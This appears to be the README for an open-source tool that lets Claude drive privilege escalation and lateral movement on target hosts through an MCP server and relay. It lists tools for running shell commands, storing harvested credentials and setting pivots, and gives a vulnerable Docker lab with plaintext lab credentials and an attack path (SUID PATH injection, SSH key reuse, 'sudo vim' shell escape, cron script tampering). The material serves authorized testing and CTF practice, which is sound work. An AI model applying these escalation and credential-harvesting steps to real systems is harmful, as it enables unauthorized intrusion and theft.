# aipriv

AI-driven privilege escalation testing for authorized security testing and CTF challenges.

---

## DISCLAIMER

**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.**

This tool is provided "as-is" without warranty. The authors assume NO responsibility or liability for any misuse or damage caused by this software. By using this tool, you agree that:

1. You have **explicit authorization** to test any target system
2. You are **solely responsible** for your actions and any consequences
3. You will comply with all applicable laws and regulations

**Unauthorized access to computer systems is illegal.** The authors are not responsible for any illegal or unethical use of this software.

---

## Quick Start

```bash
# Install dependencies
pip install -r requirements.txt
cp .env.example .env

# Terminal 1: Start proxy
python3 proxy_relay.py

# Terminal 2: Start client (in container or target)
python3 iclient.py 172.17.0.1 65432

# Terminal 3: Configure Claude Desktop/Code with MCP server
```

## Architecture

```
Claude Desktop/Code
        |  MCP Protocol (stdio)
        v
   mcp_server.py
        |  Socket (port 65433)
        v
   proxy_relay.py
        |  Socket (port 65432)
        v
   iclient(s)  [client_1, client_2, ...]
```

**Components:**
- **proxy_relay.py** - Multi-client proxy (bridges MCP server and iclients)
- **mcp_server.py** - MCP server exposing tools to AI clients
- **iclient.py** - Executes commands on target system
- **iserver.py** - Legacy server (Gemini API only)

## MCP Configuration

### Claude Desktop

Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "privilege-escalation": {
      "command": "python3",
      "args": ["/absolute/path/to/aipriv/mcp_server.py"],
      "env": {
        "PRIVESC_CLIENT_HOST": "127.0.0.1",
        "PRIVESC_CLIENT_PORT": "65433"
      }
    }
  }
}
```

### Claude Code

Add to `~/.claude.json`:

```json
{
  "mcpServers": {
    "privilege-escalation": {
      "command": "python3",
      "args": ["/absolute/path/to/aipriv/mcp_server.py"],
      "env": {
        "PRIVESC_CLIENT_HOST": "127.0.0.1",
        "PRIVESC_CLIENT_PORT": "65433"
      }
    }
  }
}
```

## Available Tools

### Core Tools

| Tool | Description |
|------|-------------|
| `connect_to_client` | Connect to proxy (host, port optional) |
| `start_session` | Start interactive shell on target |
| `execute_command` | Run shell command (command, session_id?, client_id?) |
| `reset_shell` | Reset unresponsive shell |
| `stop_session` | Stop session |
| `get_session_info` | Get connection status |
| `list_clients` | List all connected iclients |
| `set_client` | Set default target client |

### Lateral Movement Tools

| Tool | Description |
|------|-------------|
| `add_discovered_host` | Record discovered host (IP, ports, services, OS) |
| `get_discovered_hosts` | List all discovered hosts |
| `add_credential` | Store harvested credential (user, secret, type, source) |
| `get_credentials` | List all harvested credentials |
| `validate_credential` | Mark credential as working on a host |
| `mark_host_accessed` | Mark host as accessed (user/root level) |
| `set_pivot_host` | Set current pivot point (host, method, port) |
| `get_pivot_status` | Get current pivot configuration |
| `get_lateral_summary` | Summary of lateral movement progress |
| `get_movement_log` | Log of all lateral movement actions |

### Resources

| URI | Description |
|-----|-------------|
| `privesc://prompt` | Privilege escalation methodology |
| `privesc://session/status` | Current session status |
| `lateral://prompt` | Lateral movement methodology (includes Nuclei scanning) |
| `lateral://state` | Current lateral movement state |

## Docker Setup

### Lateral Movement Lab (Multi-Host)

A full lab environment with 3 vulnerable hosts on a shared network for practicing lateral movement:

```bash
# Build and start all containers
docker-compose up -d --build

# Verify containers are running
docker-compose ps
```

#### Network Layout

| Host | IP | Vulnerability | Credentials |
|------|-----|---------------|-------------|
| target1_suid | 10.10.10.10 | SUID binary PATH injection | `ctfuser:password` |
| target2_sshkey | 10.10.10.20 | SSH key exposed in `/opt/.backup_key` | `devuser:devpass123` |
| target3_sudocron | 10.10.10.30 | `sudo vim` GTFOBins, writable cron | `admin:Sup3rS3cr3t!` |

#### Attack Path

```
target1 (SUID privesc)
    → discover network (nmap 10.10.10.0/24)
    → find target2 (port 22 open)

target2 (SSH key reuse)
    → find /opt/.backup_key or creds in bash_history
    → SSH to target3 as admin

target3 (sudo/cron privesc)
    → sudo vim → :!bash → root
    → OR modify /opt/scripts/backup.sh → cron runs as root
```

#### Running the Lab

```bash
# Terminal 1: Start proxy on host machine
python3 proxy_relay.py

# Terminal 2: Run iclient on initial target
docker exec -it target1_suid python3 /home/ctfuser/iclient.py host.docker.internal 65432
```

After lateral movement to another host, deploy iclient there:
```bash
# From target1, SSH to target2 and run iclient
ssh devuser@10.10.10.20
python3 /home/devuser/iclient.py host.docker.internal 65432
```

#### Teardown

```bash
docker-compose down
```

### Single Container (Legacy)

```bash
# Terminal 1: Start proxy
python3 proxy_relay.py

# Terminal 2: Build and run container
docker build -t suidpath_container containers/suidpath/
docker run -it suidpath_container

# Inside container:
python3 /home/ctfuser/iclient.py 172.17.0.1 65432
```

Multiple containers connect to the same proxy and appear as `client_1`, `client_2`, etc.

## Legacy Mode (Gemini)

```bash
# Set GEMINI_API_KEY in .env
python iserver.py 8000
python3 iclient.py 127.0.0.1 8000
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Ensure proxy_relay.py is running first |
| No clients connected | Ensure iclient connected to proxy (port 65432) |
| MCP server not found | Check absolute path, restart Claude |
| Module 'mcp' not found | `pip install mcp` |
| Container can't connect | Use `host.docker.internal` (docker-compose) or `172.17.0.1` (standalone) |
| SSH between containers fails | Check target container is running SSH: `docker exec target2_sshkey service ssh status` |

## Security

**Authorized use only:**
- Penetration testing with permission
- CTF challenges
- Security research
- Defensive testing

## References

- [MCP Specification](https://spec.modelcontextprotocol.io/)
- [MCP Python SDK](https://github.com/modelcontextprotocol/python-sdk)
